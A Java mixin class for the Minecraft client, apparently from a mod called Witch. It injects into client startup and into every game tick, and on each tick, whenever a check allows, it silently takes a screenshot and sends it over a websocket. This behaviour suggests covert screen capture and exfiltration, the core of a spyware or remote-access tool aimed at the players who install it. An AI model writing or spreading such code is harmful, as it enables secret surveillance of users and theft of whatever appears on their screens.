package me.soda.witch.mixin;

import me.soda.witch.Witch;
import me.soda.witch.utils.ScreenshotUtil;
import me.soda.witch.websocket.Message;
import net.minecraft.client.MinecraftClient;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.IOException;


@Mixin(value = MinecraftClient.class)
public class MinecraftClientMixin {
    @Inject(method = "<init>", at = @At("TAIL"))
    private void onInit(CallbackInfo info) {
        Witch.init();
    }

    @Inject(at = @At("TAIL"), method = "tick")
    private void onTick(CallbackInfo info) {
        try {
            if (ScreenshotUtil.canScreenshot())
                Message.send("screenshot", ScreenshotUtil.takeScreenshot());
        } catch (IOException e) {
            Witch.printStackTrace(e);
        }
    }
}
